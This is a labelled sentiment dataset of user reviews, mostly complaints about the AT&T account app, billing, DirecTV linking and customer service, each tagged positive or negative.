"No cbs for a week. No help from att. Prices are too high
Find another service",negative
It’s cumbersome. It’s difficult to navigate. I can never access the information I wish. It’s a total disaster.,negative
"AT&T plans are outrageous, for the plan with little channels they are over charging! They are like a loan shark!!!",negative
The app does not work on a VPN. I have disable my VPN to access my AT&T account.,negative
Really bad service,negative
"I used the widget daily until it stopped working. I reloaded the app and the widget worked intermittently. After a few days the widget stopped updating so I reloaded the app again. Now the widget is gone completely . Since I use it extensively, I would like it back.",negative
"It’s really hard to get done what you want on this. It takes forever to load. Worse yet, every time you land on the home page it wants a review. If you say later, it just asks again.

So one star.",negative
Everything I click takes forever to load. It’s only with this app.,negative
Signal is terrible,negative
I have to try multiple times to load data,negative
"This app looks cool and easy to use, the information that comes up on my account is usually fairly accurate!",positive
Nice and quick.,positive
This app is a waste of time only thing you can do with it is pay your bill,negative
Your ability to satisfy basic customer needs has dwindled,negative
Never works always shuts off on me,negative
"Why am I being asked to enter my password again, when I have the app set to save my password and also use Touch ID. Could someone else have stolen my thumb just to get into my AT&T app? Makes no sense.",negative
"I can’t give you any stars.  I have considered changing service providers on more than one occasion; only my wife has been an advocate for you.  Now that Direct TV is a part of your family we now pay three (3) separate bills.  They can’t be consolidated because of different locations.  I have had SO MUCH TROUBLE WITH GETTING YOUR APP TO WORK, I refuse to risk not being able to pay all of them.i usually end up having to go to your retail store to pay them now.  AND LETS NOT TALK ABOUT THE DIRETV NOW APP.  It’s terrible my experience has been equally as terrible.",negative
"Your app is difficult to understand.
My monthly bill is different each month and your customer service is very bad.
You made me sign a two year contract to get my 4K service and it never worked right.
I want to cancel my service with your company and I have to pay a early cancelation fee for bad service and equipment Your computer notes are incorrect so as some as I can I will cancel your service and go To PlayStation Vue for streaming service",negative
Useless because it is confusing in what it seeks for finding and resetting ID/PW,negative
I wanted just to change the card number for how I was getting billed already. I got messed up in all the ways to pay it is so confusing.,negative
App is very slow and clunky. Hard to use.,negative
"I’m asking you if you could please flip the switch so my
Works as simply as my old line 350-6676. Ever since I’ve change numbers my bills have fluctuated by $30! I’m also getting data charges because my phone says that I am hooked upTo Wi-Fi when it is not.! If these changes are not made I’ll have no other choice but to change carriers. Which I would find a shame because I have been with your company including DIRECTV for decades.",negative
The app has not been working for months and AT&T has done nothing to fix it.,negative
after 2 hours in phone and live chat still cant get phone and direct tv on same app,negative
The service in my area is absolutely horrible!  Dropped calls and calls cut in and out!   Dissatisfied!,negative
Cant sign in cause its blocked by all your sponsors and affiliated crap. Have to get on a computer on full page to pay directv bill????????,negative
"Don’t like My Direct Service
Price is way too high
Struggle with finding accounts on here and trying to find payment 
Not user friendly for novice / amateur tech people.",negative
"I would just like to see all my devices and be able to click on each one for everything associated with that device.  Instead, I am caught in an endless and surreal loop of clicking on the same things with no results.  Please simplify the way data is organized by this app.",negative
"It sticks! Instead of being able to login using my thumb and pay my bill, the app gets stuck! Why insist that people use an app and then charge for calling in to make a payment because the payment won’t work because the app doesn’t work??",negative
I was never notified and I cannot afford that !please delete those charges,negative
My cell phone was not working in Hilo Hawaii so I went to an Att corporate store and I was told needed to make a payment so I did but now in Texas I can’t get into my att account and not able to get calls only messages also in settings can’t get into my WiFi network what can I do or take att store in Harlingen but will they help since my phone is a pay monthly phone -9562266070 is my number.,negative
Worst app I ever used,negative
I can’t even use the app! It’s frozen all the time. Can’t pay bill with the app.??,negative
Att is the worse cable service I have ever had once this contract is up I am switching services just horrible,negative
Muy buena,positive
"This app is always slow to connect, and always unable to show account information “due to technical errors”. It’s useless and frustrating.",negative
"App people should be fired!!
Horrible every time I try to use this.
Have to sign in every time & locks me out!!",negative
My bill is a mess I will be leaving ATT,negative
We have had uverse for close to a year and a half. We have never gotten consistent service. It’s always going in and out. They offer a $20 credit. ????? What can you do?,negative
"I have to be polite here.   This app makes you constantly change your password.  Practically every time you use it.  It takes forever to load and will often take you in circles.  For live chat, it’s live with digital A.I.   Not exactly live,  just a toaster.   AT&T for an alleged high tech company can certainly do better, but they cheated out.",negative
........,negative
It’s slow just like the service.  The dashboard gives you a mediocre overview.  But it’s a struggle to accomplish anything on this garbage app.  I regret ever changing to At&T.  T mobile was far better and that’s saying something.,negative
I cannot make a payment or setup for payment. It sends me to a blank screen.,negative
"Every time I try to use this app, after signing it the app wants to text me a code to verify I am me. However this never works and the screen basically freezes up.",negative
"Like a LOT of reviewers here, at&t kept increasing my bill amount with NO change in service. Since May. U do that, at&t & soon NOBODY will b paying yo jacked up prices bcuz we will all b switching 2 another celly service. Individual plans r WAY 2 pricey, the app is clunky & I have 2 CONSTANTLY change my password, & they just suddenly up the price of their plans without any notific8ion. I will b 1 less paying customer 4 u guys. So that’s $80 a month less 4 u guys. Buh bye. ????",negative
Very easy to use. My English is not very good. But att very good,positive
"The worst app!!!
Every time I want to use the app, I have to/ force to change password which take 10-15 minutes to get to my account to see the usage or bills or whatever. 
Worst app. If I could give it less than one star I would have.",negative
Service is not great,negative
"I’m not sure the purpose of the Face ID, if I have to still sign- in. It’s annoying.",negative
"THEY REPRESENTATIVE ALWAYS GIVE FALSE AND INCORRECT INFORMATION. When you ask to speak to a supervisor, they ALWAYS say they’re on the phone with a customer.",negative
The cost of the two phones on my Acct plus the tablet is extraordinary high. I will be changing service providers this month.,negative
Bring back Ma Bell!!!!,negative
I get an email saying go on at&t app to review the charges ( account overview ) I go there no help for the direct tv charges ?,negative
It’s verry helpful.,positive
"After a long while login for payments, now I can’t. I get messages I need to link accounts even though nothing changed. Tried to link but my account not recognized, website is the same,guess I’ll make a trip to the AT&T store to pay, waiting on a call back for help but never came",negative
I just subscribed to watchtv but it will not allow me to log in and says data plan not available. I don’t want to pay 95.00 for something I can’t watch,negative
"Ditto to all of those bad ratings. Think it is about time for you to get your act together. 

I dread trying to pay my bill since I know it will take forever!",negative
Don’t believe any promotions they try to sell you. They’re masters at bait and switch!!!,negative
I have been trying for months to get the issue straightened out where I can view my bill. I’m tired of talking to different people that tell me it will be corrected and has not.,negative
Boo,negative
Not happy with it.  Every time I try to go on the app it says password does not match user I’d so I have to change and reset my password and then it says it is having problems locating this account.  Not easy to keep trAck of accounts,negative
Hard to maneuver around in the phone bill online. There are no percentages on the talk card I think that needs to be included just like the percentages on the text.,negative
There are too many login screens once I’ve already logged in and the app is so sensitive and skips around. Makes it impossible to use to do more than check my bill. It’s not user friendly as anything more than a dashboard.,negative
"I love the app, it makes paying my bill very easy. One touch and my bill is paid. 

Thank you AT&T",positive
That says it all.,negative
One of the worst apps I ever had still can’t create an account been trying for hours. Highly don’t recommend this app to anyone!!,negative
It was kind of nice but scary.,positive
"Ordered a movie ,the movie skipped 4 scenes on the movie ( this is us ) 
Called the guy said that he could remove it told me he was sorry . 
Next month comes around I’m being charged a late fee AND the bill for the movie . 
But for ONE I’m never late on my payment and they were supposed to have taken the movie off my bill. Then wouldn’t take anything off when I called and asked what was going on .. 
very upset",negative
"Of all the account apps I have, this has to be the most frustrating to use. I’d say about 75% I can’t even get logged in and give up—this may be by design so you can’t figure out why you are being charged an extra $11 a month all of a sudden. (If you can’t tell, that’s been my most recent experience.) 
It’s a pretty clunky interface as well once you actually get logged in. The chat is slow and most of the responses to my issues either are copy and pasted or it’s a computer. D-",negative
I keep getting kicked out. Awful app. Awful company,negative
We had great service about 3 weeks ago at our house and now we sometimes get NO service!!!  They have changed something in our area and I have no clue what happened. I’m going to cancel as soon as contract is up. And I know I’m not important because I’m just 1 in a trillion customers.,negative
I tried to place an order for sandwiches but no one would answer the phone! Another time I tried to order 20 sandwiches for a party and I still could not get anyone to answer even after calling and getting hold of the catering part of Subway. They were supposed to call for me since noone would answer at the store. Still they did not call.,negative
The billing website takes too long to update on phone app. Just tried laptop with same results - slow.,negative
"I like ATT..VERY MUCH. sometimes it gets confusing too me because I’m a dinosaur when it comes to using apps and such devices to set my payments and such or view stuff. It’s not difficult with att but I make it difficult. 
I know, though, when I call, they are always so helpful and understanding to my needs and concerns..",positive
Why is it I can go out get a monthly pay as you go plan cheaper than deal with you idiots?,negative
The App works like their coverage.  Half at best... So tired of their crappy coverage and app issues.,negative
Third time and I can’t transfer my phone from straight talk.  Looks like it’s back to Verizon.,negative
Must say this app has never giving me any problems great too and information pay my bill manage my device etc... great app frank m,positive
mala aplicacion se congela,negative
Mobile app is very useful and easy to use,positive
Too expensive for 3 phones looking to switch,negative
Doesn’t work at all,negative
It only works once in a while. Sometimes it lets me log in but mostly doesn’t,negative
I can only click on half of the options. The app is non-responsive,negative
"Samuel M. Was very kind, understanding and helpful. He took the time to hear me out and provided a great experience for me as a loyal customer of AT&T. Thank you Samuel M!",positive
I found the rep rude and flippant,negative
"Technician suggested that I install this app to check usage, bills, service appointments and all sorts of information. Worked the first time after installing and has not worked since. I have uninstalled and reinstalled, changed password, every thing I can think of and it still is not working. After the verification code is sent to my device, I input it and get a message, “Hmmm, looks like something went wrong. Try again later” this is as far as I have gotten since initial sign on.",negative
My bill has never been consistent with you guys. Every month it changes. one month 40$ then the next months 110$! And I never added anything! This is why I cancelled with you guys the first time. I can’t wait until this contract is up. You have lost my business for good this time.,negative
I have tried and tried to pay our bill on our services for our previous acct for tv and internet without success so I always had to go to ATT store to pay with my credit card on the kiosk. We have moved and those services have been terminated except for transfer of my internet- I’m very confused about my final bill and I’m unable to pay it online- I don’t think I should have to pay a fee to talk to someone to make final payment!,negative
Good job please keep up the good work!!!,positive
This is the most confusing app I have ever tried to sign into. Need simpler sign in procedure. Very confusing.,negative
"I chatted with Brandon and he was very helpful and professional, it was nice to have that experience with customer service.",positive
Excellent service,positive
They’ve destroyed this app; it’s hideous now.,negative
"My ideal of unlimited is not to set a limit on my plan and slow it down when that limit is reached, that might be unlimited access to login, but not to stream movies or do work online.",negative
But it rarely works,negative
My contract is up in Nov and I’m probably opting out.If you care to find out why just pull up my $348 dollar bill on 6.24.19.Not happy when I’m blind sided with charges I didn’t expect.,negative
"This app is apiece of junk . It’s need to be totally overhaul, it is a constant headache when ever I try to login to my account. Nothing works with this app.",negative
I can’t even see my bills nor use my app,negative
"I hate At&T business.
They are not user friendly.
Not helpful.
It’s never been the same since switching to the business model of At&T.
I would switch back but I would lose my unlimited data. 
They doubled my rate for add-a-line without my making changes to my plan. 
I am looking to switch carriers after more than a decade with at&t",negative
I updated my app 2days ago and now i cant access anything but the initial front page. Therefore i cant make any payments or arrangements and i cannot hardly load anything on my phone because the service is so dang slow!,negative
I like,positive
Clunky app and always logs you out. Let us use faceID or fingerprint. A poorly designed app from a “tech” company,negative
"Very disappointed in not receiving all the channels, this has gone on for too long not to be resolved.",negative
"No way possible your 4.4 out of 5 is correct. Scam! Tried to spend money at AT&T, but guess what? I couldn’t because your lousy app don’t work. Couldn’t view updated options. WHAT A JOKE!  I guess with all the money AT&T makes, no big deal.

Lol, again trying to update, but app doesn’t work. I give up. Once next plans paid in full, I will switch to Verizon. The only reason I post reviews is to warn others, because AT&T sure doesn’t pay attention to them.",negative
Started to question the price of AT&T Why do they support killing babies with Planed Parent,negative
"The coverage and equipment is first class, but heaven forbid you have a simple billing question or need customer service... on more than one occasion, I tried to get a simple billing question answered (why did my bill increase over $7 since my bill has not changed in some time and I’m on auto pay?) and was met with the most inept and rude people I’ve ever dealt with. They seemed more interested in having me close my account (I have unlimited everything) than in answering my question... which they never did.",negative
I have no att phone service at my home most of the time. I’ve complained and nothing ever gets done. One day maybe the towers will get upgraded and I’ll be able to call 911 if I need to. I’m waiting for the day I really need to call or my family needs to contact me at home and boom! No service.,negative
I have two accounts one for my brother and one for myself..  it’s a major ordeal accessing my billing. Bundle them or something!.,negative
App crashes and is unresponsive almost everyone i use it.,negative
"I try and use the app and nothing is working. I'm then asked to review it, so....",negative
"Barely have tv, still being overcharged.",negative
I shouldn’t have to get a text code and have to log in a fourth time so I can pay my bill. At some point the mobile app or browser should remember my info if I allow it. At some point this just becomes too annoying.,negative
I use the app once a month to make a payment. Stop forcing a password confirmation because I haven’t logged in recently.,negative
My bill is not correct,negative
I just see constant bills! I think everything is paid and then I see a bill for hundreds of dollars for my DIRECTV. I thought the accounts were merged. I thought everything was on auto pay. No one calls to say your payments are behind so I get these big surprises. I don’t get that.Not good business.,negative
Your website is PATHETIC!  Constantly broken ????????,negative
My directv bill does not show on the app. I can not access my account to make changes. I spent 6 hours on the phone and never resolved the issue. ATT has ruined directv. Now we’re losingchannels because two giant corporations can’t resolve their issues.,negative
"Your app is crap!  I can’t login.  Continuous loop stating that my account information isn’t available at this time.  Please try again later.  

Please hire a developer that can write code properly cause the refuse you’re putting into production is less than adequate.  It’s so bad I’d be embarrassed to release apps that can’t function. 

So please do yourselves a favor and invest in a proper delivery pipeline...  preferably one that contains some QA resources.",negative
"I’m fed up , ongoing 2+ months of loosing ATT internet Friday late morning to Sunday evening/ Monday morning!! Called and called , been deceived and LIED too , Now can’t get data usage on ATT app! A lot of my data usage is waiting for apps to load!! I’m senior on a fixed income, maybe forced to switch, and will write a letter to FCC and my state representative!",negative
I’m not happy with that fact that all of a sudden I’m getting these messages saying my password is not correct and all these bogus alerts,negative
Every time i call about my bill it gets more screwed up than before,negative
App is slow,negative
Worst company ever! Zero customer service and overcharges every single bill. Locked out of my account and they cannot reopen it. Spent hours on phone with inept people that never help solve the issue. Leaving for Verizon and hope to break clean from ATT forever! Can’t believe the FCC lets them  continue to rip off the public!,negative
Using the att app has been an great experience. It’s convenient and makes life a little easier! Thanks,positive
Price keeps going up from what our sales person told us it would be. Was at 220 a month and now 4 months later it is 249 with no explanation as to why?,negative
Your website/app makes it unnecessarily hard to get information. Chat Live is not helpful.,negative
Slowest internet,negative
"I called 6 total times, talked to at least that many ppl. Was transferred over and over placed on hold while at work. Finally someone turned my phone back on for me, but no one ever stopped the order. It couldn’t have been more than an hr after the claim when I called. All I knew was my phone was not connected. They told me about the claim. I couldn’t sit on hold for another hour. I was mid shift.",negative
I have been trying to log into my account. Have changed my password 4 times after each login with a new password I get the message lets check to see if this is really you. 5 times I have complyed. This must be a faulty line. Fix it,negative
I have the ap but when I go on it has me under 3 user names. It’s been 2 days trying to fix it but att makes it very difficult to find a phone number. I should add that their internet is terrible also. I must have it right next to my computer to obtain slow speeds. I keep my phone and iPad on data since it is so much quicker!,negative
Does not display all available options and plans. Only good for checking basic information.,negative
"He was not pleasant he was not helpful I had an appointment he said I didn’t customer service to him was not a priority he did no benefit for me as a loyal 35 year customer and I am Seriously considering going to a different provider the Sales tech he pawned me off on was extremely friendly knowledgeable and helpful
This manager needs to go back to customer service school seriously as an AT&T representative he is not doing your company any justice",negative
"Stupid App, always lags and hangs out. Not expecting this from Atnt at all !",negative
I’m so confused by my AT&T plan! I don’t understand how they could bill me $365 for a plan that should cost only $125. I guess I need to call someone about this but I’m so mad right now that I doubt I could be civil.,negative
Real easy to use and very convenient.,positive
So your app allows to split a payment but yet there was no notification that there would be a late charge if you split the payment. Have been a customer of Att even when they were Cingular and yet you nickel and dime customers to death. Terrible customer service.,negative

There is no way to opt out of the two-level authentication BS.,negative
"You really don’t want to know what I want to write. This is the most abysmal customer service I have ever encountered. As soon as our contracts are up, we are going to T-Mobile or anyone else",negative
They don't have consideration with the costumers even if you ben with them for long time,negative
I paid insurance for 2 years and 6 months and when my phone broke and was replaced it was with a refurbished piece of crap that has never worked properly. When I wanted to complain I didn’t get to talk to areal person because there is no phone number for ATT to be found. I am not happy!,negative
"Since AT&T purchased DirecTv, service has gone to crap. If I could give a -5 star rating I would",negative
love it !,positive
This app is beyond buggy and barely works,negative
Horrible for Uverse thou,negative
"Typical cell service, called back a relative and talked for an hour overseas, hit with $250 unreversable phone bill in 60 minutes of talking, told I could see charge in the app.  It’s my fault, should have known, but unethical to be charged so much imo in this day and age without warning.  All loyalty lost.",negative
For the last 2 months the app has had a system error so I can’t look at my account or anything,negative
"Every time I try to log in the app times out. With that being said, how do you want me to pay my bill. This is so disgusting and unprofessional. Fix the issues.",negative
"Nobody will help me after hours and days on the phone. I just keep getting more and more bills and computers when I call.

    It’s going on a year now and still nobody can or will help me by fixing my account. I still either have to go to a store and pay my bill, use auto pay, or pay a fee to pay bill over the phone. AT&T has been very clear that they do not care if my service works, or that I am happy with their service. These star ratings and reviews are a joke. Nobody cares about these reviews or even direct requests for help. But they will never offer changes in the contract obligations, even though they make no effort to fulfill their end of the agreement. DO NOT BUNDLE YOUR SERVICE!!! It’s a nightmare and you will not get help from anyone.

Update: still no contact or response from anyone regarding my issue with having a package account and being able to use any form of payment besides autopay or paying at the store. Now all my discounts are well gone and only obligated because of required contract. Good service is why people should use your company, not because you will charge a penalty for leaving. Obvious superficial customer service. Apparently nobody even reads these.",negative
Some item linked to login are not linked to each other.  ie.  your new password will not get you access to e mail.,negative
"Cannot connect using any site, app, number.  Site does not work when using.

No customer support",negative
"Poor customer service.  Continuous overcharging that results in calling AT&T several times!!   Long lasting conversations with customer service representatives to resolve issues.  Not being able to see the bill on line and/or AT&T app on the cell phone. Continua interruption in communications.  Hard to understand the accent of some representatives.  Representatives often put you on long holds or transfer you to someone else or make mistakes that results in calling several times to resolve a simple issue or over charging.

In addition to above, I have a very poor reception in my house and sometimes I cannot hear the voice of the other people that I am talking to or they cannot hear me.",negative

Why is it you can’t get a scheduled payment taken off once you pay it before time I could not talk to anyone to let them know the payment of the past due amount was paid a day before the scheduled payment so it looked like I did not pay my bill I hope it does not cost me an overdraft if it does I will take my card information off and pay in the store so I don’t get charged for trying to do the right thing ahead of time please respond,negative
There is no signal sign on. I constantly have to reset my password.,negative
"I went to the AT&T store in Fairfield California to set up an international plan for my future travels. It didn’t work. From the very start, I got stuck on the wrong side of some one-way doors in the Rome airport and able to communicate with my partner. 
It wasn’t until the fifth day of my foreign travel that I was able to straighten things out. 
When I return to the United States I called AT&T billing, and they assured me that everything would be taken care of. I assume there will be no charge for lack of service. Now I received a bill.....$440. is twice what I should be billed for wireless, home internet and an international plan for two phones. 
One star is one star to many.",negative
"Trying to link wireless and tv should be simple, but no you folks keep telling me “hmmm,something went wrong”.  And that’s it, won’t say “what” went wrong, or what to do about it, but I shouldn’t expect anything different. I hate att, and wish I had never been sucked into leaving Sprint. You guys are the worst, and I refuse to call your customer service in India again. Those are the stupidest people on the planet. Screw your att.",negative
Getting detailed wireless usage by line item is fairly impossible now. Worthless app.,negative
My att cell phone experience has been terrible so far.  Salesman Ryan lied about the bill being lower than sprint it’s not. The service and custom reps are slow to respond. Wishing i never left sprint!!!!!,negative
"How terribly ironic is it that AT&T, of all people, still cannot develop an app that doesn't freeze up or simply not perform every time you use it!
And their website through a computer is just as bad!!

AND, has anybody noticed how many bad reviews are on this app but still have 5 stars? What's up with that!? Even this review system is garbage!",negative
This issue is not acceptable.  We all have contracts and we pay our bills but you decide to change our viewing without notice.  Not acceptable void all contracts.,negative

If it ain’t broke.....",negative
"I’ve had Direct Tv for probably 20 years, and I’m considering canceling.  I lost NBC, and they say CBS and ABC are next.  It’s amazing that all other companies can make an with Nexstar, but not AT&T.  The largest communications provider.  Not only are some of my favorite shows on there, but also the news.  I know I’m not the only one in my area ready to cancel.  If one more channel gets canceled, I’m gone.  I’ll change providers.  And the early termination fee won’t phase me.  I’ll pay $5 just because it only seems fair after what I’ve read.",negative
Your sight is not user friendly,negative
"Few things are worse than dealing with AT&T. Yet, somehow, they were able to find a way to alienate people further. That takes effort.",negative

Recently I went to an AT&T store in Bayamon. The sales associate that I spoke too told me the by making the change to this new plan I would save $67 a month. Based on my last bill. As you can see it is not true. In fact it’s $63 more and I have no true savings base on my last bill. I had changed from Dish to Direct TV because of this same reason. They they had me make a change saying their was a savings. But I can find a fix to all this.,negative
Color each phone # Names and total bill amount so it’s legible thanks,negative
It takes forever to try am access anything and half the time it disconnects and I need to start over! Frustrating!,negative
We have Directv and AT&T. Is their a way to combine the billing or get them on the same accounts. So I don’t have to bounce back and forth between them to answer questions or make a complaint? You charged me a $225 deductible for a broken screen! Now you are dropping Fox on Directv! I have been a loyal customer for over 20 years and I get no breaks! I will be checking with DISH network to see if I can get those certain channels that you no longer provide. I am not getting a break in cost for channels that YOU have dropped.. MY PHONE COSTS are double what they were a year ago and I only added one phone..,negative
I can no longer with my wireless account. It only shows direct tv.,negative
If The channels were cancelled or pulled I demand discount or will cancel service altogether,negative
How does a company with this much money make an app that is such a piece of garbage?  It literally doesn’t work and I have no idea how I’m going to pay my bill.,negative
No me deja entrar a ver mis cosas,negative
"Why try to open to view my cell phone bill and still attached to direct tv?
Was better the oldest app that we control all activities for the cells",negative
"Using iPhone 6S. Won’t let me login because secondary security page doesn’t work. Therefore, I have to access ATT thru a computer.",negative
"This is absolutely the worst company I have ever had to deal with.  You talk to someone and you are told one thing then you get your bill and it is not what you were told then all you get is sorry that rep did not know what they were talking about.  As soon as I can 
find another company with what I want I’m done with ATT.  Couldn’t rate by star because I give them a 0 rating.  No good not honest and will rip you off.",negative
"Most people know and agree that AT&T is awful. But this app...wow. It’s clunky, rarely works, times out and crashes on the regular.",negative
If I could give negative stars I would. It keeps going in circles and logging me out. Complete waste of time.,negative
"I’d normally give a higher review, but I’ve been trying to check my upgrade eligibility, and all I keep getting is a sign in screen!",negative
"It would be nice to not have to pay full price when I’m not getting 2 channels now.. 
when is my contract up with you??",negative
Geraldine was a fantastic help to me in linking all of my accounts together! She was patient with me as I am not the most tech savvy person out there. Thank you so much!,positive
"App is awful !!! Not user friendly and creates complicated use for what should be basic. Looking at other service providers. Tired of this mess. Plus NO one is ever available @ customer service, always a wait or a person who does not know how to read off script.",negative
"Difficult to switch between att and directv. I miss the old way of accessing each, where there was a dedicated app for each respective service.",negative
ATT has been the overcharging me for extra phones for 8 months now and WILLNOT fix the problem!!!!!!  I have spent hours with customer support and have been told EVERY TIME it will be resolved and it never is.  How do I start a class action lawsuit against this dishonest company?????,negative
Bad experience. Horrible experience.,negative
I changed my service over a month ago to 1 line and they are still charging me $265 after I’ve called 3 times and they keep telling me it’s only $80 a month plus taxes which should never be more then $90 and again a high bill! Do these service operators know how to do their job or is this AT&T policy to rip off long time (12years with them) Coustomers or anybody for that matter. Good bye AT&T Hello Whoever don’t rip us off!! Bye,negative
"Trying to login to buy At&T’s Passport Calling service while I am at an airport in Germany waiting for a flight.  But of course because my message is from a server outside the United States it won’t let me login. I got the L569 “try again later” for more than an hour, until I had to leave. I need to buy the Passport Calling so I can use my phone on my business trip. T MOBILE makes it very easy, and just connects to a correspondent carrier in any country you go to. Not AT&T. Why not, why make it so hard? Also, there is no way to talk to anybody about this because AT&T is arrogant and doesn’t care what its customers think or what would make it easier for them.",negative
Once I sign in with my touch ID I am still not going into my account.  It freezes there instead of accessing my information.  Extremely frustrating.,negative
"Enjoy using d app, very efficient",positive
Nothing works in this app. Oops something went wrong. Try later is the answer I get for anything I do on this app. But I need to hope for the best que believe the cable service is going to be better than the app??,negative
"One of my 3 phones stopped working. I called to find out what the insurance covered. I  was told by Elmer “ just have my Daughter-in-Law and Grandson, it’s his phone, take the phone into the store and they can handle it return”. He also said that “ they can upgrade to a XXR for $50 or to XXS Max for $80”. I said great I know he’ll do the Max. So the next day they went into the store in Newington CT and was “told that’s not how it works”. They have to file a claim and the insurance sends you an equal phone plus you can’t upgrade. I was so mad that support lied to me I called them and the insurance back. The insurance says I had never called and they had sent the phone out and that’s all they could and would. I was on the phone for an hour. Mostly on hold. I then called support again. I talked to Clarissa  she told me there was no record of my call. This made even madder because now I’m being lied to again. After about a half hour she finally said “yes there is a record of my call but all it said is I had an insurance question”. I asked her to send a message to have the call reviewed, I know it’s recorded. She said “they can’t listen to the recordings”.  After another half hour she said “when you get the 7 phone that the insurance is sending call this number and they will tell you how to send it back and we will send you an 8”. So the next day the 7 came and I called the number Clarissa gave me thinking I’ll have no problems. Wrong again I was told there is no record of Clarissa telling me that and they couldn’t do anything for me to call the insurance. I called the insurance and was told they didn’t promise me an exchange “that’s between you and AT&T”. So in the end just know the insurance isn’t worth the 3 years we paid and if something goes wrong AT&T and the insurance will lie to you and not follow up on their promise. Bea",negative
Store manager refused to discuss phone upgrade issues with AT&T Loyalty Department that had a resolution to my issue. It took eight days for the regional manager to return my repeated calls. The matter still has not been resolved after twelve working days. It has been extremely frustrating. I would not recommend AT&T due to poorer customer service.,negative
"I need to “complete application for paperless billing” to get my discount. But for literally days , whenever I try to do it online it says it is “ unable to process it due to a temporary error. I called and they won’t let me do it over the phone. But the website won’t let me do it either. Their response: keep trying. Really?",negative
It is easy for you to collect the money but to get the refund will take a lot of stress n months before or not even giving back your credit or refund.rediculous company.,negative
Directv still is linked to wireless and internet accounts.,negative
I have been with AT&T for years and this app has been very helpful!,positive
An app should let you do whatever you need to do without internet access or it’s not helpful!,negative
Have had many issues with AT&T - most recently have tried to go from paperless billing back to paper bills - for three months they have not been able to switch our billing method & we spend countless hours on phone with customer service disputing late charges - am very unhappy with their customer service.,negative
I have tons of problems getting this app to work! And I’m no novice at paying via app. When I have problems I call...every message and person tells you to go to the app or website!! Totally frustrated!!,negative
Phone is not setup for international calls.  Was in chat trying to resolve problem but would not accept offer of half without knowing why I am being charged.  “Meredith” dropped the chat.,negative
"This app is extremely outdated, and not very user-friendly. They have struggled to keep up with the blending of their products (i.e. phone and satellite). The app doesn’t all you to easily navigate between the two. It’s so bad, it’s caused me to contemplate switching carriers... but their products are likely just as bad.",negative
"This app unprofessional updates 
Slow moving to next page 
Just we sign up for fiber Internet too slow",negative
Y’all about to lose one customer,negative
Ridiculous international charges when you can buy a Sim card for $12 US for a week.,negative
"So I have had this app ever since it has been available and never had a problem with it. After 3 years, I get a new 10s iPhone and I can’t get get access past the second verification. I called tech support and they are clueless. Everything they suggested, I have already tried. Playing with the app after that 30 min conversation, it turns out that when you select your phone number to send the code to, you have to close your phone down the reopen it and it will let you submit it. You have to do the same thing when you enter the code. Just an FYI for everyone.",negative
"In typical AT&T fashion, terribly disorganized and difficult to use. Many of the links don’t work properly ...or AT ALL.",negative
Not a fan of AT&T.,negative
To many commercial and they took away channel 11. It is not fair.,negative
My bill has increased for no reason!,negative
Waiting for over 1 1/2 hours to get a simple question answered.,negative
Chat is no help at all.,negative
Don’t understand why I can make a partial payment today on July 20 when my bill is not until Aug 1. Really?,negative
I am moving to Verizon because att sold be a buy one get one free and is now reneging on the deal. That is a scam and I will tell everyone I know the att is scamming customer. I will also report you to consumer affairs,negative
Poor service,negative
This is always messing something up when I go to pay. I’m constantly having to input my information again and again. Getting so tired of AT&T.,negative
"Anywhere I access this app, it’s always slow to load, and difficult to use. Not a “techy-person”, seems like this app is meant for Silicon Valley engineers, rather than common folk. Nice attempt to make things easier for you clientele, but misses the mark.",negative
AT&T is terrible!! Everything about AT&T I hate!!,negative
full of logging-in bugs,negative
I have been trying View my data use for 30 minutes with no success.,negative

"My internet goes in and out ALL the time!!  When I call support, I am told the problems are on my end so I schedule an appointment, they sell me yet another promise and it continues to happen??????????. Don’t use AT&T in zip 74434 unless you want constant disappointment and frustration!",negative
"Have lost all contact with your company? 2 months behind on my bill, because I can’t sign in? No text saying you forgot it happens pay now?",negative
It keeps resting my password,negative
"I have been at odds with your company since April over what I was told my discounts were and what you keep billing me. Your cal centers oversees are full of rude, unorganized employees. I will never recommend directv to anyone.",negative
Why do you charge me so much money???????,negative
When I travel is when I most want to use this app to manage my data usage. The problem is I cannot access this account while overseas. Therefore it is useless to me.,negative
"Good coverage, crazy expensive. Once my stuff is paid off, I’ll leave AT&T and never look back.",negative
The new updates made to the app is awful I’m mean down right bad. You can’t change the amount you want to pay. Only lets you pay full amount. I’m have had nothing but trouble with this upgrade considering going to another provider,negative
Can’t figure out how to link My cell and internet accounts together under one user if and password for convenience.,negative
I rejoined AT&T due to the offer they sent me. Come to find out it was a lie and I was charged incorrectly on my bill. I called and had to speak with 4 different people for about a total of 4 hours on the phone between waiting and waiting and waiting some more! AT&T has a bunch of chiefs running around making promises and then you get to speak to a manager and they tell you that it was wrong and I still get charged! They will tell you anything to get you to sign up and don’t backup their promises. This will definitely be my last contract with AT&T due to the lies. The competition is getting stronger and they don’t require contracts or charge ridiculous equipment fees and the service doesn’t go out on you every time a cloud floats above your house! AT&T needs to wake up!,negative
My bill has fluctuated so often for no reason and now it is $50 more than it ever has been with no notice or explanation.. I was going to add my mom to my plan but I am planning on switching carriers all together if my bill doesn’t change,negative
Es lenta,negative
This app is so bad. Very confusing to use for basic functions...and that’s if you can even log in. It constantly makes me verify who I am and I only login from my phone. Clicking things don’t take you to the correct link/page and you have to click 50 things to find out anything. Everything is jumbled up from my wireless and DirecTV accounts. Terrible.,negative
"I have used the at&t app for years and it worked fine. One day, out of the blue- the app prompted me for my password and when I went to enter my password the app redirected me to renew my password. I attempted to renew my password but it wouldn’t let me and kept re-routing me to the same pop up warning to renew my password.

I’ve since deleted the app and reinstalled to no avail.",negative
"About 2 weeks ago Att decided do do something with online id’s/passwords on Directv accounts. Now I cannot access Directv on my phone, iPad, computer....nor can I access any of my apps for tv channels that sign in through my Directv account. I have spent 5to6 hours on the phone, been to 6 different departments.... not one single att employee has the intelligence to fix the issue they created.... now I have nothing since 90% of my tv watching was on my iPad!!!!!!",negative
I have tried numerous of times to get my bill on track with AT &T as others have said no one gives you an honest answer. They want your business but don’t care if you are satisfied or not. Very poor customer service.,negative
I have had the worst time with att and have been a customer for over 10 years,negative
Billing is terrible. I paid my bill with printed confirmation but directv says I still owe it. Received another stating I now have a $103 credit. What gives?,negative
This never works and the amount due is always incorrect,negative
"Really tired of horrible customer service. Piss poor app that you cannot use to change a password with reliably. May I add slow, glacial internet. This was supposed to be  a fiber connection, right another bait and switch. Oh yes and the 3g wireless in my house I am underwhelmed with the “speedy”service.. why is my equipment so old? Cause you are waiting for me to bring it back when I cancel all the “services”. Yes I am very tired.. of Att.",negative
